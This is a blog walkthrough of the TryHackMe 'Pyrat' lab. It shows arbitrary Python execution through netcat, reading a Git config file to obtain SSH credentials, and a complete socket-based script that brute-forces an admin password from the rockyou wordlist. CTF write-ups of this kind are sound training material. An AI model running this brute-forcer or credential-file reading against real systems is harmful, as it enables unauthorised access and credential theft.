---
layout: post
title: "THM Pytrat Workthrough"
permalink: /blog/thm_pyrat_workthrough/
---

# TryHackMe Workthrough => Pyrat

### Description

Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application's older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.

# Nmap port scan

Screenshot:

![image](/assets/images/thm/pyrat/1.png)

Port ssh (22) and Hppt (8000) is open.
Screenshot:

# Check for the http port information.

![image](/assets/images/thm/pyrat/2.png)

Basic connection ok. lets connect to port 8000 using netcat. Try to run hello world python syntax as description says there are potential python code execution vulnerability.
Screenshot:
![image](/assets/images/thm/pyrat/3.png)

We can execute python codes here.

Next I will use python code execution payload further. Try to check for incomming mails.
Screenshot:
![image](/assets/images/thm/pyrat/4.png)

May be there is something for me in `think`. Next try to read this mail.

Screenshot:
![image](/assets/images/thm/pyrat/5.png)

search for git folders.

```python
import os; print([r for r, d, ds in os.walk('/') if ".git" in d])
```

Screenshot:
![image](/assets/images/thm/pyrat/6.png)

Check git config.

![image](/assets/images/thm/pyrat/7.png)

We got username and password here. Let's try to ssh using this credential.

We have successfully loged in and in the home directory there is an `users.txt` file contains our first flag.

### Root

![image](/assets/images/thm/pyrat/8.png)

Python script to find admin password.

```python=
import socket


TARGET_IP = '10.10.118.253'
TARGET_PORT = 8000
WORDLIST = '/usr/share/wordlists/rockyou.txt'


with open(WORDLIST, 'r', encoding="latin-1") as f:
    for password in f:
        password = password.strip()
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect((TARGET_IP, TARGET_PORT))

            # Send admin
            s.sendall(b"admin\n")
            data = s.recv(4096).decode()

            # read password prompt
            if "Password:" in data:
                s.sendall((password + "\n").encode())
                data = s.recv(4096).decode()
                print(f"[TRY] Password: {password} | Response: {data.strip()}")

                if "Password:" not in data:
                    print(f"\n[SUCCESS] Password found: {password}")
                    break
            else:
                print("Error: unexpected response after sending username")

            s.close()
        except Exception as e:
            print("Error: %s " %e)

```

Now successfully got the admin password.
![image](/assets/images/thm/pyrat/9.png)

## Useful commands.

1. `nmap -sS 10.10.133.11`
2. `import os; print([r for r, d, ds in os.walk('/') if ".git" in d])`
3. `print(open("/opt/dev/.git/config").read())`
4. `ssh think@10.10.118.253`
5. `nc 10.10.118.253 8000`
